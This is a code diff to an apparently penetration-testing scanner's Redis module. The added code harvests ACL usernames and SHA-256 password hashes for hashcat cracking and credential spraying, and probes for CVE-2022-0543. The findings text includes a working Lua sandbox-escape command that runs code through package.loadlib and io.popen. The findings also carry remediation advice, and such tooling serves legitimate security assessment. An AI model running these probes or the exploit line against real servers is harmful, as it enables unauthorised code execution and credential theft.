@@ -196,6 +196,40 @@ def _deep(sock, out: dict, info: dict, timeout: float) -> None:
                 s = str(line)
                 if s.startswith("user default") and "nopass" in s:
                     out["acl_default_nopass"] = True
+        # ACL USERS + ACL GETUSER: harvest every configured username and the per-user
+        # SHA-256 password hashes (hashcat -m 1400) that Redis stores in the
+        # 'passwords' field of GETUSER's reply. Also captures flags (nopass, on/off) so
+        # the credential-store feed can distinguish real accounts from disabled ones.
+        # Never modifies anything - GETUSER is a pure read.
+        _command(sock, "ACL", "USERS")
+        users_reply = _read_reply(sock, timeout)
+        if isinstance(users_reply, list):
+            acl_users = []
+            for name in users_reply:
+                if not isinstance(name, str):
+                    continue
+                _command(sock, "ACL", "GETUSER", name)
+                gu = _read_reply(sock, timeout)
+                entry = {"user": name, "flags": [], "hashes": []}
+                if isinstance(gu, list):
+                    for i in range(0, len(gu) - 1, 2):
+                        key = gu[i]
+                        val = gu[i + 1]
+                        if key == "flags" and isinstance(val, list):
+                            entry["flags"] = [str(x) for x in val]
+                        elif key == "passwords" and isinstance(val, list):
+                            entry["hashes"] = [str(x) for x in val if x]
+                acl_users.append(entry)
+            out["acl_users"] = acl_users
+        # CVE-2022-0543: the Debian/Ubuntu Redis package leaves package.loadlib reachable
+        # from the Lua sandbox, giving unauth RCE via EVAL. A single passive probe reads
+        # a boolean - we NEVER call loadlib itself - so the check is safe on hardened
+        # builds too. -ERR / -NOSCRIPT / a renamed EVAL just leaves the flag unset.
+        _command(sock, "EVAL",
+                 "if package and package.loadlib then return 1 else return 0 end", "0")
+        lua = _read_reply(sock, timeout)
+        if isinstance(lua, int) and not isinstance(lua, bool):
+            out["cve_2022_0543"] = (lua == 1)
         # Persistence: RDB (save) or AOF (appendonly) enabled means the CONFIG-rewrite
         # file-write actually flushes to disk.
         out["persistence"] = bool((out.get("save") or "").strip()) or \
@@ -207,8 +241,8 @@ def _deep(sock, out: dict, info: dict, timeout: float) -> None:
 def probe(ip: str, port: int, timeout: float = _TIMEOUT) -> dict:
     """Connect and (read-only) fingerprint a Redis endpoint. Returns
     {reachable, unauth, version, os, role, keys, dir, dbfilename, protected_mode,
-     requirepass, ssl, modules, module_load, replication, acl_user, persistence,
-     error} - empty dict if not Redis / unreachable."""
+     requirepass, ssl, modules, module_load, replication, acl_user, acl_users,
+     cve_2022_0543, persistence, error} - empty dict if not Redis / unreachable."""
     out: dict = {"reachable": False, "unauth": False}
     try:
         sock = socket.create_connection((ip, port), timeout=timeout)
@@ -298,6 +332,21 @@ _NARRATIVE = {
         "The Redis build is old / end-of-life. Beyond the missing security fixes, "
         "several Lua-sandbox-escape and module-load RCE issues affect older lines - "
         "confirm the running version and upgrade."),
+    "redis_cve_2022_0543": (
+        "Redis is running a Debian/Ubuntu-packaged build that leaves package.loadlib "
+        "reachable from the Lua sandbox. Any client that can send EVAL - and on this "
+        "instance that is any client, because auth is not enforced - can load an "
+        "arbitrary shared object and get code execution as the redis user. This is "
+        "CVE-2022-0543; it is actively exploited by the Muhstik and Redigo botnets. "
+        "Upgrade the distro's redis-server package (the fix is in the packaging, not "
+        "upstream Redis) and enforce AUTH."),
+    "redis_acl_users": (
+        "Redis ACL enumeration returned every configured username together with the "
+        "SHA-256 password hash Redis stores for each user. The hashes are directly "
+        "feedable to hashcat -m 1400; the usernames feed the credential-spray "
+        "targeting list. Rotate the exposed accounts, restrict ACL commands to admin "
+        "users, and require authentication so ACL GETUSER is not reachable "
+        "unauthenticated."),
 }
 
 
@@ -380,6 +429,47 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "rename CONFIG/SAVE/MODULE/SLAVEOF for untrusted clients, and bind to "
                     "a trusted interface only.",
                     ["CWE-306", "CWE-284"], kind="redis_unauth"))
+            if pr.get("cve_2022_0543") is True:
+                out.append(_finding(
+                    "critical",
+                    "Redis Lua sandbox escape (CVE-2022-0543) - unauth RCE",
+                    tgt,
+                    "recce ran a read-only Lua probe under EVAL and confirmed "
+                    "package.loadlib is reachable inside the sandbox - the exact "
+                    "primitive CVE-2022-0543 abuses to load an arbitrary .so and run "
+                    "code as the redis user. This is the Debian/Ubuntu-packaged "
+                    "vulnerability actively weaponised by the Muhstik and Redigo "
+                    "botnets."
+                    + (f" (version {ver})" if ver else ""),
+                    "redis-cli",
+                    f"redis-cli -h {h.ip} -p {p.portid} EVAL "
+                    "'local f=package.loadlib(\"/lib/x86_64-linux-gnu/liblua5.1.so.0\","
+                    "\"luaopen_io\"); local io=f(); "
+                    "return io.popen(\"id\"):read(\"*a\")' 0   # only within scope",
+                    "Upgrade the distro's redis-server package (the fix ships in "
+                    "packaging, not upstream Redis) and enforce AUTH.",
+                    ["CWE-1188", "CWE-269"], kind="redis_cve_2022_0543"))
+            acl_users = pr.get("acl_users") or []
+            hashed = [u for u in acl_users
+                      if isinstance(u, dict) and u.get("hashes")]
+            if hashed:
+                names = ", ".join(u["user"] for u in hashed[:6])
+                total_hashes = sum(len(u["hashes"]) for u in hashed)
+                out.append(_finding(
+                    "medium",
+                    "Redis ACL user list and password hashes reachable", tgt,
+                    f"recce read ACL USERS and ACL GETUSER without a credential and "
+                    f"harvested {len(hashed)} user(s) with SHA-256 password hashes "
+                    f"({total_hashes} hash(es); users: {names}). The hashes are "
+                    "feedable to hashcat -m 1400; the usernames feed a targeted "
+                    "credential-spray list.",
+                    "redis-cli",
+                    f"redis-cli -h {h.ip} -p {p.portid} ACL USERS ; "
+                    f"redis-cli -h {h.ip} -p {p.portid} ACL GETUSER <user>",
+                    "Enforce authentication so ACL commands are not reachable "
+                    "unauthenticated, restrict ACL to admin users, and rotate any "
+                    "exposed account passwords.",
+                    ["CWE-200", "CWE-916"], kind="redis_acl_users"))
             if ver and _old_version(ver):
                 out.append(_finding(
                     "medium", "Redis end-of-life / legacy build", tgt,
